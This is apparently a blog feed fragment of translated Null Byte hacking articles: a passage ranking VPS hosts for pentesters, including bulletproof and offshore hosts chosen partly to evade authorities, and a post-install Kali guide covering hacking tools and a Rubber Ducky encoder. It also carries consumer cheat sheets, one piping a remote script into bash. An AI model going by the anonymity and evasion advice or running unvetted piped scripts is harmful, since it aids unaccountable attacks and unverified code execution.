Price）我相信定价透明度。这意味着提供商完全诚实地说他们的月费是多少。我的图表中列出的价格可能并不总是反映出给定提供商在主页上公布的价格。我的图表中的价格是计算所有强制性和隐藏费用后的结账价格。这些也是我在网站上找到的最便宜的VPS计划的价格。在大多数情况下，这通常有着512 MB的RAM和1个CPU内核。 渗透测试人员友好型（Pentester-Friendly）服务条款（ToS）和可接受的使用政策（AUP）可能是进入此比较图表的最高优先项。虽然最初考虑了数十个VPS提供商，但大多数明确禁止或阻止端口扫描器，有效载荷分发，网络钓鱼和（或）任何类型的黑客攻击。除了少数例外，这会立即取消VPS提供商在比较图表中的资格。 IT专业人员，安全研究人员和自学成才的白帽黑客在远程服务器上做了大量工作。对我来说很重要的是，这里的VPS提供商保留了最符合Null Byte受众需求的ToS政策。我的图表中的VPS提供商是少数几个没有完全敌视“黑客攻击”的ToS政策的提供商。 那些被认为是对渗透测试人员友好的提供商并没有在他们的ToS中明确声明允许“黑客攻击”（或任何相关术语）。没有一个VPS提供商会这样做。大多数这些提供商要么没有提及他们的ToS中的黑客攻击，要么他们的网站上根本没有提供ToS。这被认为表明黑客攻击活动非常不受欢迎，但可能不会导致帐户终止。 请求个人信息（Requests Personal Info）向任何网站提交我们的真实姓名，地址，电话号码和其他个人身份信息都是不可取的。即使匿名不是你的首要任务，VPS提供商仍有一天可能会受到攻击，并且所有客户数据都会在网上泄露。 购买VPS订阅是理想的匿名完成，因为没有人知道我们在研究或渗透测试期间会遇到什么麻烦。对于你购买的服务器上发生的事情，有朝一日可能会对VPS提供商采取法律行动，因此最好将有关你自己的少量信息存储在提供商的客户数据库中。 在大多数情况下，我发现在注册期间可以提交一个完全虚假的姓名，地址和电话号码，但我并不认为这是提供商的“好功能”。向任何合法公司提交虚假信息几乎肯定会违反提供商的服务条款并导致帐户立即终止。 VPS提供商要求的电子邮件地址不属于“个人信息”，因为匿名获取一次性电子邮件地址很容易。毕竟VPS提供商需要建立与客户沟通的有效方法。 接受比特币付款（Accepts BTC Payments）如果获得比特币（BTC）不是障碍，这可能是你的首选付款方式。目前大多数提供商都接受比特币，但使用匿名加密货币的好处大部分都被VPS提供商对个人身份信息的请求所抵消。我发现使用比特币进行在线购物比使用信用卡更快更方便。 接受预付信用卡（Accepts Prepaid Credit Cards）获取比特币进行匿名交易可能很困难。用现金购买预付卡或一次性借记卡可能更方便。如果没有使用预付借记卡实际提交付款，很难验证这一点。在大多数情况下，我能够联系客户服务代表，并从他们那里获得有关使用预付卡进行交易的直接答复。 Tor友好型网站（Tor-Friendly Website）如果你通过安全的VPN连接使用信用卡进行在线购买或通过Tor匿名进行在线购买，VPS提供商有时会暂停你的帐户。联系客户支持并解决暂停可能需要数天时间。 我使用同一个常用的Firefox浏览器通过Tor浏览了每个站点。要求访问者填写验证码以查看其网站或处理结帐的提供商被标记为对希望保持匿名的用户不友好。这并不意味着可以通过Tor进行事务处理。在查看这些网站时，我只尽可能地进入结账过程，而不实际提交付款。 不要错过：如何使用Tor匿名的访问暗网？ 公司总部所在国（Company HQ’s Country）认为提供安全加密交易的公司将与当局充分合作以捕获黑客并不是不切实际的。VPS的IP地址是否来自尊重隐私的国家并不总是重要的。如果向你提供VPS的公司位于美国或英国，他们很可能会毫不犹豫地将你的个人信息交给任何权威人士。 进一步涉及隐私问题，UKUSA协议是英国，美国，澳大利亚，加拿大和新西兰之间的协议，旨在合作收集，分析和共享情报。这个群体的成员被称为五眼联盟。这些国家因拥有侵犯隐私的法律和政策而臭名昭著。 在最尊重隐私的国家选择VPS提供商可能不是最优先考虑的问题，但至少考虑具有良好隐私法律的国家的提供商是有意义的。 离岸解决方案（Offshore Solutions）“离岸VPS”意味着服务器位于公司的国家边界位置之外，并且可能允许一定程度的自由裁量权。这对你作为渗透测试人员以及你受委托保护的公司非常重要，因为你可能会收到不应共享或泄露的妥协和敏感信息。我们鼓励读者独立询问VPS提供商，以确定他们的离岸解决方案是否适合你。 提供商指出，提供离岸解决方案通常要付出一定的代价。不应该假设他们最便宜的VPS解决方案也是其离岸选项的价格。 1、BulletShieldBulletShield是我的首选，是Null Byte读者的最佳VPS提供商。BulletShield在注册账户或准备提交比特币交易时不要求任何类型的个人信息。他们还强制要求比特币交易，并且没有明确禁止任何渗透测试活动的ToS。缺点是他们不接受预付信用卡，最便宜的价格有点贵，但如果你重视隐私，价格不一定是主要考虑因素。 在涉及公司总部时，BulletShield不会透露这些信息。快速域名搜索显示，它是由加拿大公司Tucows Domains Inc.购买的，是从位于西印度群岛偏远岛屿的Charlestown购买的。但是，这并不意味着这就是BulletShield的总部所在地，这只是域名注册商BulletShield使用注册域名的地方。 他们提供离岸解决方案和Tor友好型网站，使BulletShield整体处于领先地位。但是，一位客户服务代表向我提到“渗透测试”是“仅允许……防弹服务”，这可能是成本方面的问题。 ToS：无可用 AUP：无可用 隐私：无可用 2、BuyVMBuyVM是允许合法渗透测试的亚军，如果公司或相关人员给出明确和合法的书面同意。一位代表证实了这一点，他们说“他们需要一份来自法律团队的完整文件，代表有关目标的授权书”。他们的起价确实提升了他们的排名，VPS解决方案每月只需2.42美元。但是，他们确实要求你提供个人信息，并且为了注册帐户，“帐户详细信息必须与付款方式提供的信息相符”，这可能意味着匿名预付卡将无法使用。不过，比特币是可以被接受的。 虽然他们确实有一个Tor友好的网站，但他们总部设在加拿大，并不提供离岸解决方案，这可能是负面的，取决于你使用VPS的目的。 ToS：链接 AUP：链接 隐私：链接 3、ClientVPSClientVPS有一个ToS，即你所执行的任何导致对人身或财产“受到伤害”，侵犯版权等的行为都要你自己承担全部责任。总的来说，他们的价格是最昂贵的，但亮点包括接受比特币（预付Visa尚卡不清楚），拥有Tor友好的网站，总部设在俄罗斯（信息请求经常被忽略），并提供离岸解决方案，所有这些都巩固了其目前在排名中的地位。 除了高昂的价格外，其他缺点包括他们缺乏有关合法渗透测试的信息（他们没有回复我的询问），他们确实要求你提供个人数据。 ToS：链接 AUP：无公开链接 隐私：链接 4、VPSDimeVPSDime不是一个非常理想的选择，因为它们没有比特币支付选项，不允许客户匿名查看他们的网站，也没有任何离岸VPS解决方案。但是，他们的ToS只是明确禁止“端口扫描”。他们没有提及渗透测试，漏洞扫描，网络钓鱼或其他常见的渗透活动。当询问澄清他们的合法渗透测试政策时，他们没有回复我的电子邮件。他们的ToS太模糊了，我无法确定是否允许这样的（合法）活动。出于这个原因，我建议读者在使用他们的服务之前联系VPSDime澄清。 虽然VPSDime没有明显的好处，但它们是最便宜的选择之一。 ToS：链接 AUP：链接 隐私：链接 5、OneHost CloudOneHost Cloud是我能找到的唯一提供Kali Linux VPS和渗透测试解决方案的VPS提供商。他们的价格仅为每月6.59美元，这是该提供商的另一个主要好处，并且他们接受比特币付款。对于那些不打算在未经同意的情况下非法扫描网站或入侵实体的白帽子来说，OneHost Cloud似乎是最佳选择。毕竟如果它们提供Kali解决方案但不允许合法的渗透测试，那么对于客户来说也会非常混乱。但是，当我询问合法渗透测试时，他们只是回答： 来自此地址的所有未来电子邮件都将被阻止。 这是在没有任何理由或解释的情况下发给我的。出于这个原因，OneHost Cloud排在最后，我建议读者在执行任何类型的渗透测试之前，独立地向OneHost Cloud询问他们的ToS策略。 该提供商的其他缺点是要求提供个人信息；位于英国伦敦；没有匿名网站；并且缺乏有关离岸解决方案和预付卡的信息。 ToS：链接 AUP：无公开链接 隐私：链接 意见专业和独立渗透测试人员的选择是非常有限的。大多数VPS提供商都有检测系统，如果检测到任何类型的扫描，网络钓鱼或垃圾邮件，它们会自动暂停客户帐户。在我们的测试计划中，可能需要数天才能解决暂停并造成重大挫折。 选择愿意与我们合作以更好地保护公司网站的提供商是至关重要的。如果你是一个专业的渗透测试者，或者只是一个希望以安全和匿名的方式加强技能的新手黑客，那么选择最能满足你需求并获得乐趣的提供商。 不要错过：如何使用生日卡片破解任何人的Wi-Fi密码？ 一些评论Pulkit Singhania： Cloudsigma实际上也是一个不错的选择。 他们提供免费的vps，没有任何登录或任何注册的免费，但只有一个小时。 我亲自尝试过，它提供2GB内存和50GB硬盘，最高可达25兆字节/秒的互联网流量。 如果你使用公司电子邮件注册，则可免费试用7天]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[安装Kali Linux后要做的10件事]]></title>
    <url>%2F2019%2F02%2F25%2Fafter-kali%2F</url>
    <content type="text"><![CDATA[本文翻译自https://null-byte.wonderhowto.com/how-to/top-10-things-do-after-installing-kali-linux-0186450/ ，正文如下： 默认情况下，对于完成日常的渗透测试，Kali Linux可能没有你所需的一切。但通过一些提示，技巧和应用程序，我们可以像专业的白帽子一样快速开始使用Kali。 大多数Linux发行版都是高度可定制的。这使得个性化你的渗透测试发行版有点令人生畏。只需几个命令，我们就可以自动执行任务，安装我们喜欢的软件，创建其他用户帐户，正确配置匿名软件，以及优化我们与终端的互动。我们可以采取一些措施来改善与操作系统的交互。 1、安装GitGit是一个开源软件版本控制应用程序。它可以用于协作共享和编辑代码，但在Null Byte中通常被引用作为复制（或“克隆”）GitHub上的代码存储库的主要工具。Git是渗透测试人员必备的工具，他们希望将自己的工具集扩展到默认Kali存储库中可用的工具集之外。 可以使用下面的apt-get命令安装Git。1apt-get install git 2、配置Bash别名Bash别名非常适合创建自定义命令行快捷方式。例如，我们可以重新分配ls命令以自动使用我们最喜欢的参数。下面是正常ls输出的示例。12345ls androidbins.txt folder-pictures.png smtp.cracked text-x-generic.png bogus_gmail.creds folder.png smtp.list Windows-10 dumpzilla-b3075d1960874ce82ea76a5be9f58602afb61c39 package-x-generic.png text-x-generic.ico &apos;Windows 10 Icons&apos; 在创建ls别名后再次输出的示例。1234567891011121314151617lstotal 220K-rw------- 1 root root 15K Aug 24 2015 folder-pictures.png-rw------- 1 root root 8.7K Aug 24 2015 folder.png-rw------- 1 root root 11K Aug 24 2015 package-x-generic.png-rw------- 1 root root 5.5K Sep 3 2015 text-x-generic.pngdrwxr-xr-x 12 root root 4.0K May 31 00:44 &apos;Windows 10 Icons&apos;/drwxr-xr-x 18 root root 4.0K May 31 00:44 Windows-10/-rwxr-x--- 1 root root 103K May 31 00:49 text-x-generic.ico*drwxr-xr-x 5 root root 4.0K Jun 11 21:57 dumpzilla-b3075d1960874ce82ea76a5be9f58602afb61c39/-rw-r--r-- 1 root root 52 Jul 5 18:13 bogus_gmail.creds-rw-r--r-- 1 root root 15K Jul 5 18:28 smtp.list-rw-r--r-- 1 root root 181 Jul 5 18:43 smtp.cracked-rw-r--r-- 1 root root 23K Jul 23 18:18 androidbins.txtdrwxr-xr-x 5 root root 4.0K Jul 23 19:22 ./drwxr-xr-x 23 root root 4.0K Aug 9 04:25 ../ 我们得到了更详细的输出。ls命令现在自动使用-l，-a，-t，-h和-r参数。所有这些参数都将指示ls使用列表（-l）格式，列出所有（-a）文件——包括隐藏文件——并以人类可读（-h）的格式打印文件大小（例如，1K，234M，5G）。 我的别名还将按修改时间（-t）对输出进行排序，并反转（-r）列表的顺序，以便最近修改的文件出现在终端的底部。这个参数集合是我个人的ls偏好，但你的可能会有所不同。 要创建别名，请使用nano或你喜欢的文本编辑器打开/root/.bash_aliases。添加以下行以创建别名。 不要错过：Vim简介，每个黑客都应该知道的Unix文本编辑器 1alias ls=&apos;ls --color=always -rthla&apos; 我们还可以进一步向.bash_aliases文件添加更复杂的函数。下面是一个简单的函数示例，旨在使Kali保持最新状态。12345678function apt-updater &#123; apt-get update &amp;&amp; apt-get dist-upgrade -Vy &amp;&amp; apt-get autoremove -y &amp;&amp; apt-get autoclean &amp;&amp; apt-get clean &amp;&amp; reboot &#125; 保存对.bash_aliases文件所做的更改后，打开一个新终端以使更改生效。运行新创建的apt-updater函数将调用一系列apt-get命令，这些命令将自动更新和维护你的系统。如果先前的命令失败，＆符号（&amp;&amp;）确保该函数不会继续执行以下命令。1apt-updater 有关Bash别名的更多信息，请查看Kody的“为Wi-Fi数据包捕获设置MacOS系统”一文。 3、创建一个新的低权限用户许多应用程序（如Chromium浏览器和Tor浏览器）都不应该以root用户身份打开或使用。此类应用程序在很大程度上依赖于低级别权限来提供某种程度的安全性。某些用户为这些活动创建低特权用户帐户可能是有益的。 Takhion的“锁定Kali Linux以用于安全桌面使用”一文中详细介绍了这一概念，因此请务必查看帮助。 4、安装一个终端复用器复用器是一种平铺终端仿真器，允许我们在一个窗口内打开多个终端会话。这样做的主要好处是能够立即看到我们所有打开的终端会话，而不是将窗口叠加在一起。以下是复用器示例。有许多值得注意的复用器。如上面的屏幕截图所示，Tilix是一个开源且可靠的选项。替代方案包括tmux和screen。 Tilix可在Kali的APT存储库中使用，可以使用以下命令进行安装。123456789101112131415apt-get install tilixReading package lists... DoneBuilding dependency treeReading state information... DoneThe following additional packages will be installed: libgtkd-3-0 libphobos2-ldc-shared78 libvted-3-0 tilix-commonSuggested packages: python-nautilusThe following NEW packages will be installed: libgtkd-3-0 libphobos2-ldc-shared78 libvted-3-0 tilix tilix-common0 upgraded, 5 newly installed, 0 to remove and 466 not upgraded.Need to get 10.7 MB of archives.After this operation, 49.1 MB of additional disk space will be used.Do you want to continue? [Y/n] y 亚马逊推荐：William E. Shotts Jr.撰写的“Linux命令行大全” 5、安装你喜爱的黑客工具某些版本的Kali面向极简主义的渗透测试者，他们不希望预先安装数百个黑客工具。这意味着我们必须手动安装我们喜欢的工具。我们使用的工具类型根据我们的技能和专业领域而有所不同，但以下是一些流行的黑客工具。 Aircrack-ng：无线WEP/WPA破解实用程序。 BeEF：通过Web应用程序的浏览器漏洞利用框架。 Burp Suite：专为Web应用程序安全性而设计的图形应用。 Hydra：登录密码暴力破解实用程序。 Nikto：Web服务器安全扫描器。 Maltego：开源取证和情报收集。 Nmap：端口扫描器和网络映射器。 Wireshark：用于网络流量分析的图形应用程序。 可以使用以下命令安装这些工具。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950apt-get install maltego metasploit-framework burpsuite wireshark aircrack-ng hydra nmap beef-xss niktoReading package lists... DoneBuilding dependency treeReading state information... Donehydra is already the newest version (8.6-1kali1).The following NEW packages will be installed: beef-xss binfmt-support burpsuite fastjar fonts-droid-fallback fonts-lato fonts-noto-mono ghostscript gsfonts imagemagick imagemagick-6-common imagemagick-6.q16 jarwrapper java-wrappers javascript-common libc-ares2 libcupsfilters1 libcupsimage2 libdjvulibre-text libdjvulibre21 libdouble-conversion1 libfftw3-double3 libgmp-dev libgmpxx4ldbl libgs9 libgs9-common libhttp-parser2.8 libijs-0.35 libilmbase23 libjbig2dec0 libjs-jquery libjs-jquery-easing libjs-jquery-fancybox libjs-jquery-mousewheel libjs-jquery-ui libjs-source-map libjs-uglify libjxr-tools libjxr0 liblqr-1-0 liblua5.2-0 libmagickcore-6.q16-6 libmagickcore-6.q16-6-extra libmagickwand-6.q16-6 libnetpbm10 libnl-route-3-200 libopenexr23 libpaper-utils libpaper1 libpcre2-16-0 libqt5core5a libqt5dbus5 libqt5gui5 libqt5multimedia5 libqt5multimedia5-plugins libqt5multimediagsttools5 libqt5multimediawidgets5 libqt5network5 libqt5opengl5 libqt5printsupport5 libqt5svg5 libqt5widgets5 libruby2.5 libsbc1 libsmi2ldbl libspandsp2 libssh-gcrypt-4 libuv1 libwhisker2-perl libwireshark-data libwireshark11 libwiretap8 libwmf0.2-7 libwscodecs2 libwsutil9 libxcb-icccm4 libxcb-image0 libxcb-keysyms1 libxcb-randr0 libxcb-render-util0 libxcb-xinerama0 libxcb-xkb1 libxkbcommon-x11-0 libyaml-0-2 maltego netpbm nikto nodejs nodejs-doc openjdk-8-jre openjdk-8-jre-headless qt5-gtk-platformtheme qttranslations5-l10n rake ruby ruby-addressable ruby-ansi ruby-atomic ruby-buftok ruby-celluloid ruby-celluloid-io ruby-daemons ruby-dataobjects ruby-dataobjects-mysql ruby-dataobjects-postgres ruby-dataobjects-sqlite3 ruby-dev ruby-did-you-mean ruby-diff-lcs ruby-dm-core ruby-dm-do-adapter ruby-dm-migrations ruby-dm-serializer ruby-dm-sqlite-adapter ruby-docile ruby-domain-name ruby-em-websocket ruby-equalizer ruby-erubis ruby-eventmachine ruby-execjs ruby-faraday ruby-geoip ruby-hitimes ruby-http ruby-http-cookie ruby-http-form-data ruby-http-parser.rb ruby-json ruby-librex ruby-libv8 ruby-memoizable ruby-mime-types ruby-mime-types-data ruby-minitest ruby-mojo-magick ruby-msfrpc-client ruby-msgpack ruby-multi-json ruby-multipart-post ruby-naught ruby-net-telnet ruby-nio4r ruby-oj ruby-parseconfig ruby-power-assert ruby-public-suffix ruby-qr4r ruby-rack ruby-rack-protection ruby-ref ruby-rqrcode ruby-rspec-expectations ruby-rspec-support ruby-rubydns ruby-simple-oauth ruby-simplecov ruby-simplecov-html ruby-sinatra ruby-sqlite3 ruby-term-ansicolor ruby-test-unit ruby-therubyracer ruby-thread-safe ruby-tilt ruby-timers ruby-tins ruby-twitter ruby-uglifier ruby-unf ruby-unf-ext ruby-xmlrpc ruby-zip ruby2.5 ruby2.5-dev ruby2.5-doc rubygems-integration thin wireshark wireshark-common wireshark-qt zipThe following packages will be upgraded: aircrack-ng libcups2 libnl-3-200 libnl-genl-3-200 libxkbcommon0 metasploit-framework nmap nmap-common8 upgraded, 182 newly installed, 0 to remove and 458 not upgraded.Need to get 381 MB of archives.After this operation, 616 MB of additional disk space will be used.Do you want to continue? [Y/n] y 6、安装最新版本的TorTor可以在Kali的存储库中使用，但匿名软件应该直接从源代码获取（torproject.org）。此外，Kali的Tor版本无法可靠地维护或更新。这意味着我们可能会缺少关键的稳定性和安全性更新。 将Tor项目存储库添加到APT存储库列表中。12echo &apos;deb https://deb.torproject.org/torproject.org stretch maindeb-src https://deb.torproject.org/torproject.org stretch main&apos; &gt; /etc/apt/sources.list.d/tor.list 然后，下载Tor Project包签名密钥并将其导入APT密钥环。1234567891011121314wget -O- https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add ---2019-02-18 19:28:23-- https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.ascResolving deb.torproject.org (deb.torproject.org)... 138.201.14.197Connecting to deb.torproject.org (deb.torproject.org)|138.201.14.197|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 19665 (19K) [text/plain]Saving to: ‘STDOUT’- 100%[=================================================================================================&gt;] 19.20K 47.5KB/s in 0.4s2019-02-18 19:28:25 (47.5 KB/s) - written to stdout [19665/19665]OK 将签名密钥添加到密钥环后，您将看到“OK”输出。接下来，使用以下apt-get命令更新APT。123456789apt-get updateHit:1 http://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid InReleaseGet:2 https://deb.torproject.org/torproject.org stretch InRelease [4,965 B]Get:4 https://deb.torproject.org/torproject.org stretch/main Sources [1,169 B]Get:5 https://deb.torproject.org/torproject.org stretch/main amd64 Packages [2,400 B]Hit:3 http://archive-3.kali.org/kali kali-rolling InReleaseFetched 8,534 B in 8s (1,091 B/s)Reading package lists... Done 使用以下命令安装Tor，你就完成了。1234567891011apt-get install tor deb.torproject.org-keyringReading package lists... DoneBuilding dependency treeReading state information... DoneSuggested packages: mixmaster torbrowser-launcher socat tor-arm apparmor-utils obfs4proxyThe following NEW packages will be installed: deb.torproject.org-keyringThe following packages will be upgraded: tor 7、使用Syncthing配置文件共享由Jakob Borg创建的Syncthing是一种跨平台，私有，轻量级文件同步（Dropbox）替代方案。作为渗透测试人员，在VPS和本地Kali机器之间传输按键日志，屏幕截图，网络摄像头录像和敏感的战利品文件可能是一项令人沮丧的任务。Syncthing使安全的文件共享完全无痛。 我在前一篇文章中介绍了Syncthing的安装和配置。读者应参考该详细的分步指南。 8、安装代码编辑器Atom是一个免费的，开源的，功能丰富且高度可定制的文本编辑器。其功能包括实时协作共享代码，直观的编码自动补全功能，以及安装软件包的能力，这些都进一步增强了Atom的多功能性。其他值得注意的文本编辑包括Geany和Gedit。 要安装Atom，请访问他们的网站并下载最新的Debian安装程序。接下来，使用下面的apt-get命令打开终端并安装所需的依赖项。1234567891011121314151617181920212223apt-get install gvfs gvfs-common gvfs-daemons gvfs-libs gconf-service gconf2 gconf2-common gvfs-bin psmiscReading package lists... DoneBuilding dependency treeReading state information... DoneCorrecting dependencies... DoneThe following NEW packages will be installed: gconf-service (3.2.6-4.1) gconf2 (3.2.6-4.1) gconf2-common (3.2.6-4.1) gvfs-bin (1.36.2-1) libgconf-2-4 (3.2.6-4.1) psmisc (23.1-1+b1)The following packages will be upgraded: gvfs (1.36.1-1 =&gt; 1.36.2-1) gvfs-common (1.36.1-1 =&gt; 1.36.2-1) gvfs-daemons (1.36.1-1 =&gt; 1.36.2-1) gvfs-libs (1.36.1-1 =&gt; 1.36.2-1)4 upgraded, 6 newly installed, 0 to remove and 462 not upgraded.1 not fully installed or removed.Need to get 3,317 kB of archives.After this operation, 8,909 kB of additional disk space will be used.Do you want to continue? [Y/n] y 最后，使用命令行包管理器dpkg和install（-i）参数。12345678dpkg -i ~/Downloads/atom-amd64.deb(Reading database ... 191882 files and directories currently installed.)Preparing to unpack atom-amd64.deb ...Unpacking atom (1.29.0) over (1.29.0) ...Setting up atom (1.29.0) ...Processing triggers for desktop-file-utils (0.23-3) ...Processing triggers for mime-support (3.60) ... 完成后，Atom将显示在“应用程序”菜单中。 9、克隆橡皮鸭（Rubber Ducky）编码器USB橡皮鸭是臭名昭著的按键注入工具。利用DuckToolKit网站可以很容易地创建ducky payloads，但作为一个渗透测试人员，与随机网站共享客户信息是不安全的。将有效载荷内容上载到第三方网站可能很危险。 相反，我们可以使用Git克隆USB橡皮鸭存储库并在本地编码有效载荷。12345678git clone https://github.com/hak5darren/USB-Rubber-DuckyCloning into &apos;USB-Rubber-Ducky&apos;...remote: Counting objects: 1657, done.remote: Total 1657 (delta 0), reused 0 (delta 0), pack-reused 1657Receiving objects: 100% (1657/1657), 31.88 MiB | 162.00 KiB/s, done.Resolving deltas: 100% (745/745), done.Checking out files: 100% (1509/1509), done. 然后，将当前目录更改（cd）为USB-Rubber-Ducky/Encoder/ 目录，并使用以下java命令开始编码没有第三方网站的ducky payloads。12cd USB-Rubber-Ducky/Encoder/java -jar encoder.jar -i input_payload.txt -o inject.bin 10、更改SSH密钥和默认密码每个Kali Linux安装的默认密码都是相同的（toor），这使得自动化攻击非常容易。此外，当你通过SSH控制树莓派之类的东西时，默认的SSH密钥可以允许攻击者拦截你的通信。 要更改SSH密钥，请首先切换目录。执行以下两个命令将重置SSH密钥的默认值。1234cd /etc/ssh/dpkg-reconfigure openssh-serverrescue-ssh.target is a disabled or a static unit, not starting it. 现在，对于你的Kali系统密码，输入passwd root，然后输入你的新密码。然后，重新输入以确认。如果你未以root用户身份登录，则可能会在执行此操作之前询问你当前的密码。12345passwd rootEnter new UNIX password:Retype new UNIX password:passwd: password updated successfully 安装Kali后你做的第一件事是什么？我们都有不同程度的兴趣，技能和经验水平。这使得编写完整的安装后步骤列表变得棘手。我错过了任何关键步骤吗？你如何个性化和定制新安装的Kali？请务必在下面发表评论。]]></content>
      <categories>
        <category>Translation</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[说说VPS]]></title>
    <url>%2F2019%2F01%2F08%2Ftalk-about-vps%2F</url>
    <content type="text"><![CDATA[VPS（Virtual Private Server）即虚拟专用服务器，它不等同于独立服务器，独立服务器是指货真价实的物理机器，而VPS则是在独立服务器上虚拟化的多个虚拟机器。与此类似的，虚拟空间（或虚拟主机）则是指VPS上某个特定的应用环境，它没有访问系统底层的权限。显然，独立服务器偏贵，虚拟空间限制又多，而VPS这一中间选择成为了广大爱好者的首选。 虚拟化技术VPS所使用的虚拟化技术主要有KVM和OpenVZ（简称OVZ），以下是两者的优缺点对比：KVM： 优点：独占内核、内存等 缺点：价格较贵 OpenVZ： 优点：价格低 缺点：共享内核、内存等 简单来说，KVM拥有对内核更多的控制权，而OpenVZ因为共享资源的情况受超售影响较大，现在，越来越多的VPS商家也开始使用KVM架构来虚拟化VPS。个人建议，尽量选择KVM架构的VPS。 收费方式VPS一般按两种方式收费，即按月收费或按小时收费，显然，按小时收费更加灵活，当不需要使用时，直接关机就能停止收费。除此之外，VPS一般会限制每月最多可使用的流量，当超过额度后，会收取流量费。 VPS商家当前主流的VPS商家有：BandwagonHost，Vultr，DigitalOcean。 BandwagonHost，中文又称搬瓦工，它们采用按月收费，支持支付宝付款，在2019年之前，它们推出过最低每年19.99美元的VPS，这应该是那时候最便宜且稳定的VPS商家了，但如今它们已经取消了这一方案，并全部使用KVM架构，现在它们的最低方案是每年49.99美元，配置1G内存，20G固态，每月1T的流量。 Vultr，它们采用按小时收费的方式，支持支付宝付款，全部采用KVM架构，现在最低的方案是每年42美元，配置512MB内存，10G固态，每月0.5T的流量，个人非常推荐。 DigitalOcean，它们同样采用按小时收费的方式，使用信用卡付款，全部采用KVM架构，现在最低的方案是每年60美元，配置1G内存，25G固态，每月1T的流量。 测试VPS性能一般在首次连接到VPS之后，建议进行一个性能测试，通常要测试的项目包括磁盘性能、网络性能以及一些基本参数等。这里推荐使用oldking开发的一键测试脚本SuperBench.sh，具体使用方法如下命令所示：1wget -qO- git.io/superbench.sh | bash 黑话VPS相关的论坛中经常会有一些行业黑话，以下做简要说明： 杜甫：即独服的意思，指前面提到的独立服务器。 母鸡：指用来虚拟化VPS的物理主机。 小鸡：即VPS，尤其指配置比较低的廉价VPS。 养鸡：续费VPS的过程。 CN2线路：指中国电信与美国日本韩国香港等地机房直连的服务器线路，速度快且稳定。 套路云：指阿里云。 良心云：指腾讯云。 雨林云：指AWS，取自亚马逊热带雨林。 一些建议如果你的VPS内存较小，比如512M内存以下，则建议安装32位操作系统。操作系统建议选择CentOS 7以上。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[说说MS Office]]></title>
    <url>%2F2019%2F01%2F08%2Ftalk-about-ms-office%2F</url>
    <content type="text"><![CDATA[Office是最常使用的办公套件，一般来说，提到Office，最先想到的是微软的Office，即MS Office，除此之外，还有WPS Office，这是由金山推出的。 Office原生支持Windows桌面版，这也是目前功能最全且收费的Office版本，时至今日，Office也可以用于UWP、Android、iOS、macOS以及Web等。一般来说，我们说的Office是指Windows桌面版的Office套件。 在本文写作之际，最新的Office版本为Office 2019，但据个人观察，Office 2010仍然被大多数人所使用。Office套件一般包括以下软件： Word：文档编辑工具 Excel：表格编辑工具 PowerPoint：幻灯片演示文稿制作工具 Access：小型数据库 OneNote：在线笔记应用 Outlook：电子邮箱应用 Publisher：桌面出版应用软件 Visio：流程图制作工具 以Office 2016为例，其中自带的OneNote全称为OneNote 2016（桌面版）；除此之外，还有Microsoft Store中UWP版的OneNote，即OneNote for Windows 10，简称为OneNote，此版本的OneNote是功能最全的OneNote，也是微软的主要开发版，并内置于所有的Windows 10电脑中，另外，Office 2019套件中也已替换成了此版本的OneNote。关于OneNote（OneNote for Windows 10）与OneNote 2016的详细区别请参考微软Office官方帮助信息：OneNote与OneNote 2016有什么区别？ Office 365不同于Office 2016或Office 2019的一次性购买模式，Office 365采用订阅模式，即每月支付一定费用。它可以享受到更多的优惠，比如1TB的OneDrive空间和持续的软件更新等。具体可参考微软Office官方帮助信息：Office 365和Office 2019之间的区别是什么？ G SuiteG Suite是由Google公司推出的办公套件，其中主要包括Google Docs（文档）、Google Sheets（表格）、Google Slides（幻灯片）等，适用于Android、iOS、Web平台。这些软件兼容Office的文件格式。 iWorkiWork是由苹果公司推出的办公套件，其中主要包括Pages文稿、Numbers表格、Keynote讲演，适用于macOS、iOS平台。这些软件生成的文件格式与Office中的Word、Excel、PowerPoint互不兼容。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[说说信用卡]]></title>
    <url>%2F2019%2F01%2F08%2Ftalk-about-credit-card%2F</url>
    <content type="text"><![CDATA[年费所谓年费，即每年的管理费，几乎所有信用卡都有年费，年费一般可以通过两种方法免去，即刷够指定额度或刷够指定笔数，具体采用哪种方法依据特定的信用卡而定。有的信用卡是“终身免年费”的，这里的终身一般指信用卡的有效期内。 有效期为了保护信用卡的安全，信用卡是有有效期的，一般印在信用卡上的VALID THRU字段，比如05/26代表2026年5月过期，过期之后要重新去银行办理。 等级信用卡的等级从低到高一般分为普卡、金卡（Gold）、白金卡（Platinum）等，等级越高，优惠越多，额度越大，但相应的，年费也会越高。 溢缴款信用卡不同于借记卡（或储蓄卡），信用卡的主要目的是用于消费，而不是存款，因此，存在信用卡里面的钱是没有利息的，这笔钱被叫做溢缴款，溢缴款取现是要收取手续费的。但在消费时，会优先扣除溢缴款，随后扣除额度。 银行卡组织不同银行之间要实现互相转账就要靠银行卡组织的协调，在中国使用最多的卡组织是银联（UnionPay），在美国使用最多的卡组织是Visa，在欧洲使用最多的卡组织是MasterCard（万事达），在日本使用最多的卡组织是JCB。当你准备在海外购物时，就十分有必要办一张支持海外卡组织的信用卡，比如Visa信用卡。 双标卡国内有一些信用卡上面既有银联的标志，也有海外卡组织的标志，这种卡就是双标卡。它可以在付款的时候选择指定的卡组织，比如在国内购物使用银联，在国外购物使用Visa。但是，按照国际惯例，一张卡只能归属于一个银行卡组织，这样看来，还是传统的两张单标卡更靠谱一点。 信用卡安全码信用卡安全码常为3位数字，印在卡片背面卡号后四位处，Visa的安全码叫做CVV2（Card Verification Value 2），银联的安全码叫做CVN2（Card Validation Number 2），JCB的安全码叫做CAV2（Card Authentication Value 2）。安全码相当于信用卡的密码，常用于网络交易的过程中，所以，请保护好自己的安全码，不要被泄露。 主卡副卡币种PayPal借记卡和储蓄卡]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
